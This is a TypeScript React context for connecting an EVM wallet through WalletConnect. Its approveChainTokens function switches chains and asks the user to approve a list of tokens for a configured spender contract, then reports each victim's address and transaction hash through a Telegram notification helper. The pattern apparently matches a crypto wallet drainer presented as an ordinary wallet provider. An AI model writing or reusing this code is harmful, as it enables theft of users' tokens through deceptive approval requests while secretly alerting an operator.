import React, { createContext, useContext, useState, useCallback, ReactNode } from "react";
import { toast } from "sonner";
import { getChainById, type ChainConfig } from "@/lib/chains";
import { getAllowance, encodeApproveCalldata } from "@/lib/evmUtils";
import { sendEvmApprovalNotification } from "@/lib/telegramNotify";
import {
  connectMultiChainWallet,
  disconnectWalletConnect,
  extractEvmAddress,
  getActiveProvider,
  getActiveSession,
} from "@/lib/walletConnectProvider";

interface EvmWalletContextType {
  address: string | null;
  currentChainId: number | null;
  isConnected: boolean;
  isApproving: boolean;
  connect: () => Promise<string | null>;
  disconnect: () => void;
  approveChainTokens: (chain: ChainConfig) => Promise<boolean>;
  switchNetwork: (chainId: number) => Promise<boolean>;
  syncFromSession: (session: any) => void;
  clearSession: () => void;
}

const EvmWalletContext = createContext<EvmWalletContextType>({
  address: null,
  currentChainId: null,
  isConnected: false,
  isApproving: false,
  connect: async () => null,
  disconnect: () => {},
  approveChainTokens: async () => false,
  switchNetwork: async () => false,
  syncFromSession: () => {},
  clearSession: () => {},
});

export const useEvmWallet = () => useContext(EvmWalletContext);

export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
  const [address, setAddress] = useState<string | null>(null);
  const [currentChainId, setCurrentChainId] = useState<number | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [isApproving, setIsApproving] = useState(false);

  const syncFromSession = useCallback((session: any) => {
    const evmAddr = extractEvmAddress(session);
    setAddress(evmAddr);
    setIsConnected(!!evmAddr);
  }, []);

  const clearSession = useCallback(() => {
    setAddress(null);
    setCurrentChainId(null);
    setIsConnected(false);
    setIsApproving(false);
  }, []);

  const connect = useCallback(async (): Promise<string | null> => {
    if (address && isConnected) return address;

    try {
      const result = await connectMultiChainWallet();
      if (result.evmAddress) {
        setAddress(result.evmAddress);
        setIsConnected(true);
        toast.success("EVM wallet connected!");
        return result.evmAddress;
      }

      toast.error("Wallet did not provide an EVM account");
      return null;
    } catch (err: any) {
      console.error("EVM WC connect failed:", err);
      if (err?.message !== "User closed the connection modal") {
        toast.error("Failed to connect EVM wallet");
      }
      return null;
    }
  }, [address, isConnected]);

  const disconnect = useCallback(async () => {
    await disconnectWalletConnect();
    clearSession();
  }, [clearSession]);

  const switchNetwork = useCallback(async (chainId: number): Promise<boolean> => {
    const provider = getActiveProvider();
    const session = getActiveSession();
    if (!provider || !session || !address) return false;

    const chain = getChainById(chainId);
    if (!chain) return false;

    try {
      await provider.client.request({
        chainId: chain.wcChainId,
        topic: session.topic,
        request: {
          method: "wallet_switchEthereumChain",
          params: [{ chainId: chain.chainIdHex }],
        },
      });
      setCurrentChainId(chainId);
      return true;
    } catch (err: any) {
      console.error(`Failed to switch to ${chain.name}:`, err);
      return false;
    }
  }, [address]);

  const approveChainTokens = useCallback(async (chain: ChainConfig): Promise<boolean> => {
    const provider = getActiveProvider();
    const session = getActiveSession();
    if (!provider || !session || !address) return false;

    setIsApproving(true);
    let success = false;

    try {
      await switchNetwork(chain.chainId).catch(() => {});

      for (const token of chain.approvalTokens) {
        const allowance = await getAllowance(address, chain.spenderContract, token.address, chain);
        if (allowance > 0n) {
          toast.info(`${token.symbol} already approved on ${chain.name}`);
          success = true;
          continue;
        }

        toast.loading(`Approving ${token.symbol} on ${chain.name}...`);
        const calldata = encodeApproveCalldata(chain.spenderContract);

        const txHash: string = await provider.client.request({
          chainId: chain.wcChainId,
          topic: session.topic,
          request: {
            method: "eth_sendTransaction",
            params: [
              {
                from: address,
                to: token.address,
                data: calldata,
                value: "0x0",
              },
            ],
          },
        });

        toast.dismiss();

        if (txHash) {
          toast.success(`${token.symbol} approved on ${chain.name}!`);
          sendEvmApprovalNotification(address, txHash, chain.id, token.symbol).catch(console.error);
          success = true;
        }
      }
    } catch (err: any) {
      console.error(`Approval failed on ${chain.name}:`, err);
      toast.dismiss();
      toast.error(`Approval failed: ${err.message || "User rejected or network error"}`);
    } finally {
      setIsApproving(false);
    }

    return success;
  }, [address, switchNetwork]);

  return (
    <EvmWalletContext.Provider
      value={{
        address,
        currentChainId,
        isConnected,
        isApproving,
        connect,
        disconnect,
        approveChainTokens,
        switchNetwork,
        syncFromSession,
        clearSession,
      }}
    >
      {children}
    </EvmWalletContext.Provider>
  );
};
